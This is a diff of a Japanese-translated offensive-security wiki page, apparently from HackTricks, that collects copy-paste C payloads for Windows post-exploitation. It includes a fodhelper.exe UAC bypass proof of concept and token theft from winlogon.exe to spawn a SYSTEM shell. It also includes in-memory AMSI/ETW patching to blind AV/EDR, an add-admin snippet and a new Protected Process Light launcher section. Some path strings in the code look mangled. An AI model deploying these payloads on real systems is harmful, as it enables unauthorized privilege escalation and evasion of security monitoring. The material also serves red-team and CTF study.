@@ -1,14 +1,14 @@
-# Windows C Payloads
+# Windows C ペイロード
 
 {{#include ../../banners/hacktricks-training.md}}
 
-このページでは、Windowsのローカル特権昇格やポストエクスプロイト中に便利な**小さく、自己完結したCスニペット**を集めています。各ペイロードは**コピー＆ペーストしやすい**ように設計されており、Windows API / Cランタイムのみを必要とし、`i686-w64-mingw32-gcc` (x86) または `x86_64-w64-mingw32-gcc` (x64) でコンパイルできます。
+このページは、Windows Local Privilege Escalation や post-exploitation の際に便利な、**小さく自己完結した C スニペット** を集めたものです。各ペイロードは**コピー＆ペーストしやすい**よう設計されており、Windows API / C ランタイムのみを必要とし、`i686-w64-mingw32-gcc` (x86) や `x86_64-w64-mingw32-gcc` (x64) でコンパイルできます。
 
-> ⚠️  これらのペイロードは、プロセスがアクションを実行するために必要な最小限の特権（例：`SeDebugPrivilege`、`SeImpersonatePrivilege`、またはUACバイパスのための中程度の整合性コンテキスト）をすでに持っていることを前提としています。これらは、脆弱性を悪用して任意のネイティブコード実行が可能な**レッドチームまたはCTF設定**を目的としています。
+> ⚠️  これらのペイロードは、プロセスが既にその操作を行うために必要な最小限の権限（例: `SeDebugPrivilege`、`SeImpersonatePrivilege`、または medium-integrity context for a UAC bypass）を持っていることを前提としています。これらは、脆弱性の悪用により任意のネイティブコード実行を得た **red-team or CTF settings** を意図しています。
 
 ---
 
-## Add local administrator user
+## ローカル管理者ユーザーを追加
 ```c
 // i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
 #include <stdlib.h>
@@ -20,14 +20,14 @@ return 0;
 ```
 ---
 
-## UACバイパス – `fodhelper.exe` レジストリハイジャック (中 → 高整合性)
-信頼されたバイナリ **`fodhelper.exe`** が実行されると、以下のレジストリパスを **`DelegateExecute` 動詞をフィルタリングせずに** クエリします。このキーの下にコマンドを植え付けることで、攻撃者はファイルをディスクに落とすことなくUACをバイパスできます。
+## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
+信頼されたバイナリ **`fodhelper.exe`** が実行されると、以下のレジストリパスを参照しますが **`DelegateExecute` 動詞をフィルタリングしません**。そのキーの下にコマンドを仕込むことで、攻撃者はファイルをディスクに書き込むことなく UAC をバイパスできます。
 
-*`fodhelper.exe` によってクエリされたレジストリパス*
+*`fodhelper.exe` が参照するレジストリパス*
 ```
 HKCU\Software\Classes\ms-settings\Shell\Open\command
 ```
-最小限のPoCで、昇格された`cmd.exe`をポップします：
+昇格した `cmd.exe` を起動する最小限のPoC:
 ```c
 // x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
 #define _CRT_SECURE_NO_WARNINGS
@@ -61,12 +61,12 @@ system("fodhelper.exe");
 return 0;
 }
 ```
-*Windows 10 22H2およびWindows 11 23H2（2025年7月のパッチ）でテスト済み。バイパスはまだ機能します。なぜなら、Microsoftは`DelegateExecute`パスの欠落した整合性チェックを修正していないからです。*
+*Windows 10 22H2 および Windows 11 23H2（2025年7月パッチ）でテスト済み。Microsoft は `DelegateExecute` パスに欠落している整合性チェックを修正していないため、このバイパスはまだ有効です。*
 
 ---
 
-## トークン複製によるSYSTEMシェルの生成（`SeDebugPrivilege` + `SeImpersonatePrivilege`）
-現在のプロセスが**両方**の`SeDebug`および`SeImpersonate`特権を保持している場合（多くのサービスアカウントに典型的）、`winlogon.exe`からトークンを盗み、それを複製して昇格したプロセスを開始できます：
+## token duplication による SYSTEM シェルの起動 (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
+現在のプロセスが **両方** の `SeDebug` と `SeImpersonate` 権限を持っている場合（多くのサービスアカウントで典型的）、`winlogon.exe` からトークンを奪い、複製して昇格したプロセスを開始できます：
 ```c
 // x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
 #include <windows.h>
@@ -102,7 +102,7 @@ DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPri
 STARTUPINFOW si = { .cb = sizeof(si) };
 PROCESS_INFORMATION pi = { 0 };
 if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
-L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
+L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
 NULL, NULL, &si, &pi)) {
 CloseHandle(pi.hProcess);
 CloseHandle(pi.hThread);
@@ -114,7 +114,7 @@ if (dupToken) CloseHandle(dupToken);
 return 0;
 }
 ```
-For a deeper explanation of how that works see:
+その仕組みのより詳細な説明については次を参照してください:
 
 {{#ref}}
 sedebug-+-seimpersonate-copy-token.md
@@ -122,8 +122,8 @@ sedebug-+-seimpersonate-copy-token.md
 
 ---
 
-## インメモリ AMSI & ETW パッチ (防御回避)
-ほとんどの現代の AV/EDR エンジンは、悪意のある動作を検査するために **AMSI** と **ETW** に依存しています。現在のプロセス内で両方のインターフェースを早期にパッチすることで、スクリプトベースのペイロード（例：PowerShell、JScript）がスキャンされるのを防ぎます。
+## メモリ内 **AMSI** & **ETW** Patch (Defence Evasion)
+ほとんどの最新の AV/EDR エンジンは、悪意のある動作を検査するために **AMSI** と **ETW** に依存しています。現在のプロセス内で両方のインターフェイスを早期にパッチすると、スクリプトベースのペイロード（例: PowerShell、JScript）がスキャンされるのを防げます。
 ```c
 // gcc -o patch_amsi.exe patch_amsi.c -lntdll
 #define _CRT_SECURE_NO_WARNINGS
@@ -150,12 +150,56 @@ MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
 return 0;
 }
 ```
-*上記のパッチはプロセスローカルであり、それを実行した後に新しいPowerShellを起動すると、AMSI/ETW検査なしで実行されます。*
+*上記のパッチはプロセスローカルです。実行後に新しい PowerShell を起動しても AMSI/ETW による検査を受けません。*
 
 ---
 
-## 参考文献
+## 子プロセスを Protected Process Light (PPL) として作成
+`STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` を使用して、作成時に子プロセスに PPL 保護レベルを要求します。これはドキュメント化された API で、ターゲットイメージが要求された signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb) 用に署名されている場合にのみ成功します。
+```c
+// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
+#include <windows.h>
+
+int wmain(void) {
+STARTUPINFOEXW si = {0};
+PROCESS_INFORMATION pi = {0};
+si.StartupInfo.cb = sizeof(si);
+
+SIZE_T attrSize = 0;
+InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
+si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
+InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
+
+DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
+UpdateProcThreadAttribute(si.lpAttributeList, 0,
+PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
+&lvl, sizeof(lvl), NULL, NULL);
+
+if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
+EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
+// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
+return 1;
+}
+DeleteProcThreadAttributeList(si.lpAttributeList);
+HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
+CloseHandle(pi.hThread);
+CloseHandle(pi.hProcess);
+return 0;
+}
+```
+よく使われるレベル:
+- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
+- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
+- `PROTECTION_LEVEL_LSA_LIGHT` (4)
+
+結果は Process Explorer/Process Hacker の Protection 列を確認して検証してください。
+
+---
+
+## 参考資料
 * Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
 * SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
+* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
+* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
 
 {{#include ../../banners/hacktricks-training.md}}
